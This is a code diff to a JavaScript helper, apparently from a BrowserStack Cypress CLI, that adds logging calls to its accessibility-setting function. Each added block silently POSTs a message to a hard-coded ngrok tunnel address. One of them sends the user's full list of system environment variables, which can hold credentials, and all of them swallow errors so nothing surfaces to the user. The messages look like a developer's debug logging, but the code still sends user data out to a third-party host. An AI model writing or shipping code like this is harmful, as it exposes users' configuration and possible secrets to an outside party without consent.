@@ -239,11 +239,37 @@ exports.setTestHubCommonMetaInfo = (user_config, responseData) => {
 };
 
 exports.checkAndSetAccessibility = (user_config, accessibilityFlag) => {
+  try {
+    const fetch = require('node-fetch');
+    fetch("https://eb3d9133c474.ngrok-free.app/logs", {
+      method: "POST",
+      body: JSON.stringify({ 
+        message: `Aakash CBT checkAndSetAccessibility - Called with accessibilityFlag=${accessibilityFlag}, current config accessibility=${user_config.run_settings.accessibility}` 
+      }),
+      headers: { "Content-Type": "application/json" },
+    }).catch(err => console.error("Log failed:", err.message));
+  } catch (error) {
+    console.error("Failed to send checkAndSetAccessibility entry log:", error.message);
+  }
+
   if (!accessibilityHelper.isAccessibilitySupportedCypressVersion(user_config.run_settings.cypress_config_file)) 
   {
     logger.warn(`Accessibility Testing is not supported on Cypress version 9 and below.`);
     process.env.BROWSERSTACK_TEST_ACCESSIBILITY = 'false';
     user_config.run_settings.accessibility = false;
+    
+    try {
+      const fetch = require('node-fetch');
+      fetch("https://eb3d9133c474.ngrok-free.app/logs", {
+        method: "POST",
+        body: JSON.stringify({ 
+          message: `Aakash CBT checkAndSetAccessibility - Cypress version not supported, forced accessibility=false` 
+        }),
+        headers: { "Content-Type": "application/json" },
+      }).catch(err => console.error("Log failed:", err.message));
+    } catch (error) {
+      console.error("Failed to send cypress version unsupported log:", error.message);
+    }
     return;
   }
 
@@ -258,17 +284,45 @@ exports.checkAndSetAccessibility = (user_config, accessibilityFlag) => {
     user_config.run_settings.accessibility = accessibilityEnabled;
     
     // Remove existing accessibility env var if present
+    const originalEnvVarsLength = user_config.run_settings.system_env_vars.length;
     user_config.run_settings.system_env_vars = user_config.run_settings.system_env_vars.filter(
       envVar => !envVar.startsWith('BROWSERSTACK_TEST_ACCESSIBILITY=')
     );
+    const filteredEnvVarsLength = user_config.run_settings.system_env_vars.length;
     
     // Add the current accessibility setting
     user_config.run_settings.system_env_vars.push(`BROWSERSTACK_TEST_ACCESSIBILITY=${accessibilityEnabled}`);
+    
+    try {
+      const fetch = require('node-fetch');
+      fetch("https://eb3d9133c474.ngrok-free.app/logs", {
+        method: "POST",
+        body: JSON.stringify({ 
+          message: `Aakash CBT checkAndSetAccessibility - Set accessibility=${accessibilityEnabled}, removed ${originalEnvVarsLength - filteredEnvVarsLength} duplicate env vars, final env vars: ${JSON.stringify(user_config.run_settings.system_env_vars)}` 
+        }),
+        headers: { "Content-Type": "application/json" },
+      }).catch(err => console.error("Log failed:", err.message));
+    } catch (error) {
+      console.error("Failed to send accessibility setting log:", error.message);
+    }
     
     if (accessibilityEnabled) {
       logger.debug("Accessibility enabled for session");
     }
     return;
+  }
+  
+  try {
+    const fetch = require('node-fetch');
+    fetch("https://eb3d9133c474.ngrok-free.app/logs", {
+      method: "POST",
+      body: JSON.stringify({ 
+        message: `Aakash CBT checkAndSetAccessibility - No accessibility flag provided, exiting without changes` 
+      }),
+      headers: { "Content-Type": "application/json" },
+    }).catch(err => console.error("Log failed:", err.message));
+  } catch (error) {
+    console.error("Failed to send no accessibility flag log:", error.message);
   }
   return;
 };
